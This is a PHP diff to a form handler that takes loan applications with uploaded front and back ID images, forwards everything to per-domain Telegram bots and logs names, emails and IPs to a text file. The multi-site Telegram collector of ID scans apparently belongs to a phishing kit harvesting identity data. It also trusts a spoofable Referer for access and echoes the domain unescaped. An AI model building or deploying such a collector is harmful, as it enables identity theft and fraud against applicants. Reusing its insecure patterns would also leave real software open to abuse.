@@ -19,11 +19,16 @@ $site_map = [
     // ➕ Add more site configs here
 ];
 
-$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
-$config = $site_map[$domain] ?? null;
+
+// 🧠 Detect form source domain
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$parsed  = parse_url($referer);
+$domain  = $parsed['host'] ?? 'unknown';
+$config  = $site_map[$domain] ?? null;
 
 if (!$config) {
-    header("HTTP/1.1 404 Not Found"); exit;
+    header("HTTP/1.1 403 Forbidden");
+    exit("❌ Unauthorized domain: $domain");
 }
 
 $bots = $config['bots'];
@@ -83,7 +88,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $front_id_path = handleUpload('q94_uploadSelected94', 'front_id');
     $back_id_path = handleUpload('q95_uploadBack', 'back_id');
 
-    // 📤 Send message
+    // 📤 Build Telegram message
     $message = "📝 *New Loan Application*\n\n" .
                "💵 *Desired Loan:* $desired_loan\n" .
                "💰 *Annual Income:* $annual_income\n" .
@@ -117,7 +122,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         curl_setopt_array($ch, [CURLOPT_POST => 1, CURLOPT_POSTFIELDS => $data, CURLOPT_RETURNTRANSFER => true]);
         curl_exec($ch); curl_close($ch);
 
-        // Upload files if available
+        // Upload files
         foreach ([$front_id_path => '📎 Front ID', $back_id_path => '📎 Back ID'] as $file => $caption) {
             if (!$file || !file_exists($file)) continue;
             $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
@@ -135,10 +140,10 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         }
     }
 
-    // 📜 Log request
+    // 📝 Log submission
     file_put_contents("log.txt", "[$timestamp] $domain | $ip | $full_name | Loan: $desired_loan | Email: $email\n", FILE_APPEND);
 
-    // 🚪 Redirect
+    // ✅ Redirect to thank-you page
     header("Location: $redirect_url");
     exit;
 }
